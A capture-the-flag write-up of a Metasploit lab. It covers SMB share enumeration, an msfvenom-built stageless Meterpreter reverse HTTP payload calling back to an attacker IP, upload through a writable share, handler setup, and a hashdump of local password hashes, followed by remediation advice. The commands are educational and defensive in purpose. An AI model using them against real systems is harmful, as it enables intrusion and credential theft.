## Lab Summary

The objective of this capstone was to apply the techniques covered throughout the Metasploit module. The exercise required the creation of a custom Windows Meterpreter payload, delivery through a guest-writable SMB share, configuration of a matching Metasploit handler and post-exploitation of the resulting session.

The target permitted outbound HTTP and HTTPS traffic. A stageless HTTP Meterpreter payload was therefore used to establish a reliable reverse connection through an allowed protocol.

Final compromise chain:

    SMB enumeration
    → guest-writable public share
    → stageless Meterpreter payload upload
    → scheduled execution
    → Meterpreter session
    → local password hash extraction
    → flag retrieval

Confirmed lab details used during the demonstration:

    Target IP: 10.130.133.81
    Kali tun0 IP: 192.168.129.186
    Attacker working directory: /tmp/VK

## Tools Used

The main tools used were:

- `nmap` for TCP port scanning, service detection and default NSE scripts.
- `smbclient` for anonymous SMB share enumeration.
- `msfvenom` for generating the Windows Meterpreter executable.
- `msfconsole` for SMB file upload, handler configuration and session management.
- `Meterpreter` for post-exploitation, password hash extraction and file-system searching.

## Initial Enumeration

The first step was to identify the services exposed by the target.

From the Kali Linux terminal:

```bash
nmap -sC -sV -p- 10.130.133.81
```

The options used were:

- `-sC` to run the default Nmap scripts.
- `-sV` to perform service and version detection.
- `-p-` to scan all 65,535 TCP ports.

The important findings were:

```text
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  http
47001/tcp open  http
```

Several additional dynamic RPC ports were also exposed.

The scan identified a Windows host named `CAPSTONE`. Port `445/tcp` confirmed that SMB was available, making it the most relevant service for the guest-writable share described by the room.

Nmap also reported that SMB signing was enabled but not required:

```text
smb2-security-mode:
  3.1.1:
    Message signing enabled but not required
```

## SMB Share Enumeration

The available SMB shares were enumerated without supplying credentials:

```bash
smbclient -L //10.130.133.81 -N
```

The `-N` option suppresses the password prompt and attempts an anonymous or guest session.

The target returned the following shares:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
internal        Disk      Internal files
IPC$            IPC       Remote IPC
public          Disk      Public uploads
```

The `public` share matched the scenario description and was identified as the likely guest-writable upload location.

The SMB1 workgroup lookup failed after the share listing:

```text
Unable to connect with SMB1 -- no workgroup available
```

This did not affect the enumeration result. The SMB2/SMB3 share listing had already completed successfully.

## Payload Selection

The room specified two important requirements:

1. The payload should be stageless for reliability.
2. The target only allowed outbound HTTP or HTTPS traffic.

A stageless 64-bit Windows Meterpreter payload using HTTP was selected:

```text
windows/x64/meterpreter_reverse_http
```

This differs from a staged payload such as:

```text
windows/x64/meterpreter/reverse_http
```

The underscore in `meterpreter_reverse_http` indicates the stageless form, where the complete Meterpreter payload is included in the generated executable.

## Generating the Meterpreter Payload

The payload was generated from the Kali working directory:

```bash
cd /tmp/VK
```

The following `msfvenom` command created the executable:

```bash
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.129.186 LPORT=80 -f exe -o payload.exe
```

The command options were:

- `-p windows/x64/meterpreter_reverse_http` selected the stageless 64-bit Windows Meterpreter payload.
- `LHOST=192.168.129.186` set the callback address to the Kali `tun0` interface.
- `LPORT=80` used an outbound HTTP-compatible port.
- `-f exe` generated a Windows executable.
- `-o payload.exe` saved the result as `payload.exe`.

Metasploit confirmed successful payload generation:

```text
No encoder specified, outputting raw payload
Payload size: 249948 bytes
Final size of exe file: 257024 bytes
Saved as: payload.exe
```

No encoder was required for this lab. Encoding does not inherently make a payload undetectable and should not be confused with antivirus evasion.

## Loading the SMB Upload Module

Metasploit Framework was started and the SMB upload utility was loaded:

```bash
msfconsole -q -x 'use auxiliary/admin/smb/upload_file'
```

The `-q` option starts Metasploit without the banner. The `-x` option executes the supplied console command after startup.

Metasploit displayed:

```text
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

The module can upload through an existing SMB session or connect directly to a remote host.

## Configuring the SMB Upload

The target and share were configured:

```text
set RHOSTS 10.130.133.81
set SMBSHARE public
```

An initial attempt was made to use the option name `LOCALFILE`:

```text
set LOCALFILE /tmp/VK/payload.exe
```

Metasploit returned:

```text
[!] Unknown datastore option: LOCALFILE.
```

Rather than guessing, the module options were checked:

```text
show options
```

The relevant options were:

```text
LPATH    The path of the local file to utilise
RPATH    The name of the remote file relative to the share
SMBSHARE The name of a writable share on the server
RHOSTS   The target host
```

The correct file settings were then applied:

```text
set LPATH /tmp/VK/payload.exe
set RPATH payload.exe
```

This configured:

- `LPATH` as the local payload on Kali.
- `RPATH` as the name to use within the remote `public` share.

## Uploading the Payload

The module was executed:

```text
run
```

Metasploit confirmed that the executable had been uploaded:

```text
[+] 10.130.133.81:445 - /tmp/VK/payload.exe uploaded to payload.exe
[*] 10.130.133.81:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The lab scenario stated that a scheduled task monitored the writable share and processed uploaded executable files. This target-side automation was responsible for triggering the payload.

In a real assessment, scheduled execution should never be assumed without evidence. Here, it was an intentional part of the authorised TryHackMe scenario.

## Configuring the Metasploit Handler

The SMB upload module was replaced with Metasploit's generic payload handler:

```text
use exploit/multi/handler
```

The handler had to match the payload type and callback settings used by `msfvenom`:

```text
set PAYLOAD windows/x64/meterpreter_reverse_http
set LHOST 192.168.129.186
set LPORT 80
```

The listener was started:

```text
run
```

Metasploit reported:

```text
[*] Started HTTP reverse handler on http://192.168.129.186:80
```

Matching the handler to the generated payload is essential. A staged handler cannot reliably handle a stageless payload when the payload types do not correspond.

## Receiving the Meterpreter Session

After the scheduled task executed the uploaded payload, the target connected to the HTTP handler.

Relevant output included:

```text
[*] http://192.168.129.186:80 handling request from 10.130.133.81
[*] Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened
```

The session connected from the target to Kali:

```text
192.168.129.186:80 -> 10.130.133.81:<ephemeral-port>
```

The prompt changed to:

```text
meterpreter >
```

This confirmed successful code execution and an active Meterpreter session on the Windows target.

Warnings relating to payload UUID tracking were also displayed because the Metasploit database was not connected:

```text
Without a database connected that payload UUID tracking will not work!
```

These warnings did not prevent the session from opening and were not relevant to completing the room.

## Dumping Local Password Hashes

From the Meterpreter prompt, the local Security Account Manager database was queried:

```text
hashdump
```

The output used the standard format:

```text
username:RID:LM-hash:NTLM-hash:::
```

Several local accounts were returned, including:

```text
Administrator
DefaultAccount
Guest
jim
WDAGUtilityAccount
```

The entry for `jim` followed this structure:

```text
jim:1008:<LM-HASH>:<NTLM-HASH>:::
```

The value required by the room is the fourth colon-separated field: the NTLM hash.

For spoiler control, the answer is not reproduced in this public write-up.

Answer:

```text
<REDACTED>
```

## Searching for the Flag

The room stated that the flag was located somewhere beneath:

```text
C:\Users\Administrator
```

Meterpreter's recursive search function was used:

```text
search -d C:\\Users\\Administrator -f flag*
```

The command options were:

- `-d` to specify the directory in which to search.
- `-f flag*` to match files beginning with `flag`.

Meterpreter returned one result:

```text
C:\Users\Administrator\Documents\flag.txt
```

The file was then read directly:

```text
cat C:\\Users\\Administrator\\Documents\\flag.txt
```

The flag was displayed in the standard TryHackMe format:

```text
THM{<REDACTED>}
```

The exact value has been intentionally omitted from this public write-up.

## Full Attack Chain Recap

### 1. Service discovery

A full TCP scan identified a Windows host with SMB exposed on port `445/tcp`.

### 2. Anonymous SMB enumeration

An anonymous `smbclient` listing revealed a `public` share described as `Public uploads`.

### 3. Payload generation

A stageless 64-bit Windows Meterpreter HTTP payload was generated with `msfvenom`. The callback used the Kali `tun0` IP address and TCP port `80`.

### 4. SMB payload delivery

Metasploit's `auxiliary/admin/smb/upload_file` module uploaded the executable to the guest-writable `public` share.

### 5. Handler configuration

The `exploit/multi/handler` module was configured with the exact same payload, listening address and port as the generated executable.

### 6. Scheduled execution

The target-side scheduled task processed the uploaded executable, causing it to connect back to the HTTP handler.

### 7. Meterpreter post-exploitation

The resulting Meterpreter session was used to dump local password hashes and identify the NTLM hash belonging to `jim`.

### 8. Flag discovery

Meterpreter recursively searched `C:\Users\Administrator`, located `Documents\flag.txt` and displayed its contents.

## Key Lessons

This capstone demonstrated several important Metasploit concepts:

- Payload and handler settings must match exactly.
- Staged and stageless payloads are different and use different Metasploit names.
- Payload transport should be selected according to the target's permitted outbound traffic.
- The callback address must be reachable from the target; in this lab, that was the Kali `tun0` IP address.
- Anonymous SMB access can expose writable shares and dangerous upload paths.
- `show options` should be used when a module rejects or does not recognise an option.
- Metasploit auxiliary modules can support delivery and administration tasks without using a separate exploit module.
- Meterpreter provides built-in post-exploitation commands for credential access and file-system searching.
- Database-related warnings do not necessarily indicate that a Meterpreter handler has failed.

A particularly useful troubleshooting lesson was the correction from the invalid `LOCALFILE` option to the module's actual `LPATH` and `RPATH` settings. Checking the loaded module's options is more reliable than relying on option names from older versions or unrelated modules.

## Remediation Notes

The weaknesses represented in this lab could be mitigated by:

- Disabling anonymous or guest access to SMB shares.
- Applying least-privilege permissions to shared directories.
- Preventing untrusted users from uploading executable content.
- Avoiding scheduled tasks that automatically execute files from writable locations.
- Separating upload directories from execution paths.
- Applying application allow-listing controls such as Windows Defender Application Control or AppLocker.
- Restricting outbound traffic to approved destinations rather than allowing unrestricted access based only on destination port.
- Monitoring SMB write activity and newly created executable files.
- Enabling and enforcing SMB signing where appropriate.
- Using endpoint detection and response controls to identify suspicious payload execution and Meterpreter behaviour.
- Protecting privileged Windows processes and the SAM database from unauthorised access.
- Reviewing service accounts and scheduled tasks for excessive privileges.

The primary design failure was not simply that a share was writable. The critical issue was that attacker-controlled executable content placed in that share was subsequently processed by a privileged automated task.
